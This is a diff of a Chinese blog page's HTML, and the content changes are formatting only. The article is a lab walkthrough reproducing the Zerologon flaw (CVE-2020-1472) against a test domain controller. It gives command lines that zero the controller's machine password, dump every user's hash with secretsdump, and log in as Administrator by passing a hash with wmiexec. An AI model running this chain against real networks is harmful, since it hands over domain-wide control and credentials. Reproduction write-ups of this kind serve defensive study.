@@ -11,7 +11,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
   <meta name="description" content="CVE-2020-1472 2020年08月12日， 360CERT监测发现Windows官方 发布了 NetLogon 特权提升漏洞 的风险通告，该漏洞编号为 CVE-2020-1472，漏洞等级：严重，漏洞评分：10分。攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程">
-<meta name="keywords" content="内网渗透,漏洞复现">
+<meta name="keywords" content="漏洞复现,内网渗透">
 <meta property="og:type" content="article">
 <meta property="og:title" content="域内提权CVE-2020-1472">
 <meta property="og:url" content="http://klforever.cn/2020/12/01/14/index.html">
@@ -263,10 +263,10 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h2 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h2><blockquote>
+    <h2><span id="cve-2020-1472">CVE-2020-1472</span></h2><blockquote>
 <p>2020年08月12日， 360CERT监测发现Windows官方 发布了 NetLogon 特权提升漏洞 的风险通告，该漏洞编号为 CVE-2020-1472，漏洞等级：严重，漏洞评分：10分。<br>攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程序。<br>对此，360CERT建议广大用户及时为各Windows Server操作系统安装最新相关补丁。与此同时，请做好资产自查以及预防工作，以免遭受黑客攻击。</p>
 </blockquote>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><pre class="line-numbers language-python"><code class="language-python">Windows Server <span class="token number">2008</span> R2 <span class="token keyword">for</span> x64<span class="token operator">-</span>based Systems Service Pack <span class="token number">1</span>
+<h2><span id="影响版本">影响版本</span></h2><pre class="line-numbers language-python"><code class="language-python">Windows Server <span class="token number">2008</span> R2 <span class="token keyword">for</span> x64<span class="token operator">-</span>based Systems Service Pack <span class="token number">1</span>
 Windows Server <span class="token number">2008</span> R2 <span class="token keyword">for</span> x64<span class="token operator">-</span>based Systems Service Pack <span class="token number">1</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
 Windows Server <span class="token number">2012</span>
 Windows Server <span class="token number">2012</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
@@ -279,17 +279,17 @@ Windows Server <span class="token number">2019</span> <span class="token punctua
 Windows Server<span class="token punctuation">,</span> version <span class="token number">1903</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
 Windows Server<span class="token punctuation">,</span> version <span class="token number">1909</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
 Windows Server<span class="token punctuation">,</span> version <span class="token number">2004</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>EXP：<br><a href="https://github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/dirkjanm/CVE-2020-1472</a><br><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a><br><a href="https://github.com/SecuraBV/CVE-2020-1472/" target="_blank" rel="noopener">https://github.com/SecuraBV/CVE-2020-1472/</a></p>
+<h2><span id="复现">复现</span></h2><p>EXP：<br><a href="https://github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/dirkjanm/CVE-2020-1472</a><br><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a><br><a href="https://github.com/SecuraBV/CVE-2020-1472/" target="_blank" rel="noopener">https://github.com/SecuraBV/CVE-2020-1472/</a></p>
 <p>靶机ip：192.168.21.109 （win server 2012 r2）</p>
-<h3 id="首先在进入内网环境下获取到域控服务器的NetBIOS名称"><a href="#首先在进入内网环境下获取到域控服务器的NetBIOS名称" class="headerlink" title="首先在进入内网环境下获取到域控服务器的NetBIOS名称"></a>首先在进入内网环境下获取到域控服务器的NetBIOS名称</h3><pre class="line-numbers language-python"><code class="language-python">nbtstat <span class="token operator">-</span>A DC_IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3><span id="首先在进入内网环境下获取到域控服务器的netbios名称">首先在进入内网环境下获取到域控服务器的NetBIOS名称</span></h3><pre class="line-numbers language-python"><code class="language-python">nbtstat <span class="token operator">-</span>A DC_IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/images/14/1.png" alt></p>
-<h3 id="检测目标是否能够利用此漏洞"><a href="#检测目标是否能够利用此漏洞" class="headerlink" title="检测目标是否能够利用此漏洞"></a>检测目标是否能够利用此漏洞</h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token punctuation">.</span>\zerologon_tester<span class="token punctuation">.</span>py DC <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3><span id="检测目标是否能够利用此漏洞">检测目标是否能够利用此漏洞</span></h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token punctuation">.</span>\zerologon_tester<span class="token punctuation">.</span>py DC <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/images/14/2.png" alt></p>
-<h3 id="将域控服务器中的机器账户密码打空"><a href="#将域控服务器中的机器账户密码打空" class="headerlink" title="将域控服务器中的机器账户密码打空"></a>将域控服务器中的机器账户密码打空</h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token punctuation">.</span>\cve<span class="token number">-2020</span><span class="token operator">-</span><span class="token number">1472</span><span class="token operator">-</span>exploit<span class="token punctuation">.</span>py DC <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3><span id="将域控服务器中的机器账户密码打空">将域控服务器中的机器账户密码打空</span></h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token punctuation">.</span>\cve<span class="token number">-2020</span><span class="token operator">-</span><span class="token number">1472</span><span class="token operator">-</span>exploit<span class="token punctuation">.</span>py DC <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/images/14/3.png" alt></p>
-<h3 id="获取目标机器中所有用户的hash"><a href="#获取目标机器中所有用户的hash" class="headerlink" title="获取目标机器中所有用户的hash"></a>获取目标机器中所有用户的hash</h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token punctuation">.</span>\secretsdump<span class="token punctuation">.</span>py de1ay<span class="token punctuation">.</span>com<span class="token operator">/</span>DC$@<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span> <span class="token operator">-</span>no<span class="token operator">-</span><span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3><span id="获取目标机器中所有用户的hash">获取目标机器中所有用户的hash</span></h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token punctuation">.</span>\secretsdump<span class="token punctuation">.</span>py de1ay<span class="token punctuation">.</span>com<span class="token operator">/</span>DC$@<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span> <span class="token operator">-</span>no<span class="token operator">-</span><span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/images/14/4.png" alt></p>
-<h3 id="使用Administrator用户登陆de1ay域"><a href="#使用Administrator用户登陆de1ay域" class="headerlink" title="使用Administrator用户登陆de1ay域"></a>使用Administrator用户登陆de1ay域</h3><pre class="line-numbers language-python"><code class="language-python">python wmiexec<span class="token punctuation">.</span>py <span class="token operator">-</span>hashes aad3b435b51404eeaad3b435b51404ee<span class="token punctuation">:</span><span class="token number">161cff084477fe596a5db81874498a24</span> de1ay<span class="token punctuation">.</span>com<span class="token operator">/</span>Administrator@<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3><span id="使用administrator用户登陆de1ay域">使用Administrator用户登陆de1ay域</span></h3><pre class="line-numbers language-python"><code class="language-python">python wmiexec<span class="token punctuation">.</span>py <span class="token operator">-</span>hashes aad3b435b51404eeaad3b435b51404ee<span class="token punctuation">:</span><span class="token number">161cff084477fe596a5db81874498a24</span> de1ay<span class="token punctuation">.</span>com<span class="token operator">/</span>Administrator@<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/images/14/5.png" alt></p>
 <p>这个Hash也可解出来<br><img src="/images/14/6.png" alt><br><img src="/images/14/7.png" alt><br>后续恢复密码<br><a href="https://www.cnblogs.com/Yang34/p/13678632.html" target="_blank" rel="noopener">https://www.cnblogs.com/Yang34/p/13678632.html</a></p>
 <p>具体原理<br><a href="https://blog.csdn.net/smellycat000/article/details/108633744" target="_blank" rel="noopener">https://blog.csdn.net/smellycat000/article/details/108633744</a></p>
@@ -309,11 +309,11 @@ Windows Server<span class="token punctuation">,</span> version <span class="toke
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网渗透</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网渗透</a>
         		</li>
       		
 		</ul>
@@ -433,7 +433,7 @@ Windows Server<span class="token punctuation">,</span> version <span class="toke
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-1472"><span class="toc-number">1.</span> <span class="toc-text">CVE-2020-1472</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#影响版本"><span class="toc-number">2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现"><span class="toc-number">3.</span> <span class="toc-text">复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#首先在进入内网环境下获取到域控服务器的NetBIOS名称"><span class="toc-number">3.1.</span> <span class="toc-text">首先在进入内网环境下获取到域控服务器的NetBIOS名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#检测目标是否能够利用此漏洞"><span class="toc-number">3.2.</span> <span class="toc-text">检测目标是否能够利用此漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#将域控服务器中的机器账户密码打空"><span class="toc-number">3.3.</span> <span class="toc-text">将域控服务器中的机器账户密码打空</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取目标机器中所有用户的hash"><span class="toc-number">3.4.</span> <span class="toc-text">获取目标机器中所有用户的hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用Administrator用户登陆de1ay域"><span class="toc-number">3.5.</span> <span class="toc-text">使用Administrator用户登陆de1ay域</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.</span> <span class="toc-text">CVE-2020-1472</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">3.</span> <span class="toc-text">复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">3.1.</span> <span class="toc-text">首先在进入内网环境下获取到域控服务器的NetBIOS名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">3.2.</span> <span class="toc-text">检测目标是否能够利用此漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">3.3.</span> <span class="toc-text">将域控服务器中的机器账户密码打空</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">3.4.</span> <span class="toc-text">获取目标机器中所有用户的hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">3.5.</span> <span class="toc-text">使用Administrator用户登陆de1ay域</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -573,6 +573,10 @@ Windows Server<span class="token punctuation">,</span> version <span class="toke
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
@@ -581,11 +585,11 @@ Windows Server<span class="token punctuation">,</span> version <span class="toke
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">免杀</a>
+                <a href="javascript:void(0)" class="js-tag color3">提权</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -593,19 +597,11 @@ Windows Server<span class="token punctuation">,</span> version <span class="toke
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Web安全</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql server</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">提权</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+                <a href="javascript:void(0)" class="js-tag color1">Web安全</a>
               </li>
              
               <li class="article-tag-list-item">
